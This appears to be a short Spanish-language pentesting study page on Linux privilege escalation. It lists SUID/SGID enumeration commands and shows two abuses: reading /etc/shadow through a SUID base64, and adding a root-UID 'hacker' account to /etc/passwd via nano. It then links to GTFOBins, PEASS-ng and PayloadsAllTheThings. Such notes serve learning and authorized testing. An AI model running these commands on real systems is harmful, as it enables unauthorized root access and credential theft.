# Tools and Methodology PrivEsc

## Methodology

.

{% code overflow="wrap" %}
```bash
# para obtener todos los SUID
find / -perm -4000 2>/dev/null

# para obtener todos los SGID/"GUID"
find / -perm -2000 2>/dev/null

# encuentra todos los sticky bits
find / -perm -1000 2>/dev/null

# Buscar en GTFOBins si alguno de los programas listados anteriormente tiene SUID

# Seguir los pasos y explotar

Otro:
# Enumerar los archivos que tienen configurados los bits SUID o SGID
find / -type f -perm -04000 -ls 2>/dev/null
```
{% endcode %}

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

Ejemplos de aplicaciones:

* Base64

{% code overflow="wrap" %}
```bash
LFILE=/etc/shadow  #Ponemos en variable LFILE el archivo con priv que queremos leer
/usr/bin/base64 "$LFILE" | base64 --decode #Ejecutamos lectura con base64 que tiene SUID
```
{% endcode %}

* Nano

{% code overflow="wrap" %}
```bash
# Generar un valor hash de la contraseña que queremos que tenga el nuevo usuario con openssl
openssl passwd -a salt <algo> <password>
# Luego agregaremos esta contraseña con un nombre de usuario al /etc/passwd archivo abriendo con sudo porque tiene el bit SUID
sudo nano /etc/passwd
hacker:<hash>:0:0:root:/root:/bin/bash
#cambiar a ese usuario
su hacker
```
{% endcode %}

![](<../.gitbook/assets/image (11).png>)

## Tools

GTFOBins: a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.

{% embed url="https://gtfobins.github.io/" %}
GTFOBins link
{% endembed %}

LinPEAS & WinPEAS:&#x20;

{% embed url="https://github.com/carlospolop/PEASS-ng" %}

LinuxPrivEsc

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md" %}

WindowsPrivEsc

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" %}
